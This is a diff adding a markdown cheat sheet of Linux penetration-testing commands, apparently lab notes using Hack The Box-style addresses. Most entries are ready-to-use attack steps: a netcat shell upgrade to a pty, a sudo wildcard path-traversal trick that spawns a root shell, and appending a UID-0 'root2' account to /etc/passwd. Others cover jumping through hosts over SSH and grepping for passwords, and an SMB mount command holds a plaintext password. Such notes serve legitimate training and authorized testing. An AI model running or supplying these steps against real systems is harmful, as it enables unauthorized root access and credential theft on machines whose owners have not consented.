@@ -1,0 +1,124 @@
+## ps, only list certain cats
+
+```
+ps -e -o user,pid,command
+```
+
+
+## login ssh with custom id_rsa
+
+```
+ssh -i id_rsa dexter@10.10.10.216
+```
+
+## Easy Pretty bash shell after you connect with nc (yes, this still works well!!!)
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+^Z
+stty raw -echo
+fg
+```
+
+use `stty sane` to revert!!!!
+---
+
+</br>
+
+
+## **--> Port Forward and Double Hop with SSH**
+
+```
+ssh -L 5555:10.10.10.8:3389 -J dog@192.168.1.12 cat@192.168.122.36
+
+```
+
+##  **Sudo command** as a specific user (run after a sudo -l)
+
+```
+sudo -u onuma tar
+```
+
+## **Sudo Commnd** file description
+
+```
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*
+
+
+## This means I can run the "nice" command for everything in the "/notes/" dir, however since we use a "*" this can include ".." thus to get root:
+
+sudo /bin/nice /notes/../bin/bash
+```
+
+## Add user to passwd file
+
+```
+openssl passwd -crypt -salt salty passwordy
+
+
+    openssl passwd -crypt -salt xx password
+
+prints xxj31ZMTZzkVA. --> Put this in column two of passwd
+
+    openssl passwd -1 -salt xxxxxxxx password
+
+prints $1$xxxxxxxx$UYCIxa628.9qXjpQCjM4a. --> Put this in column two of passwd
+
+    openssl passwd -apr1 -salt xxxxxxxx password
+
+prints $apr1$xxxxxxxx$dxHfLAsjHkDRmG83UXe8K0. 
+```
+
+## Add user to passwd file (easier way)
+
+```
+openssl passwd evil
+echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+```
+
+
+## Enumerate for "unique" bins:
+
+```
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+```
+
+
+## Convert Windows UTF16 files to Linux UTF8
+
+```
+echo "windows" | iconv UTF-16LE -t UTF-8
+
+```
+
+## Run less with WINPEAS colors (Bash colors)
+
+```
+less -R winpeas.txt
+```
+
+## Mount SMB Share to local fs
+
+```
+sudo mount -t cifs -o 'username="user", password="password"' //10.10.10.172/Users /mnt/folder
+```
+
+## Mount SMB Share for SMB 1.0
+
+```
+sudo mount -t cifs -o 'username="admin",password="$weetNess11#",vers=1.0' '//10.11.1.5/C$' /mnt/point/
+```
+
+## list kernel modules
+
+```
+lsmod
+```
+
+## Grep, look for text in files recursivly while ignoring certain file extensions!!!
+
+```
+fgrep -nr password --exclude=\*.js *
+```
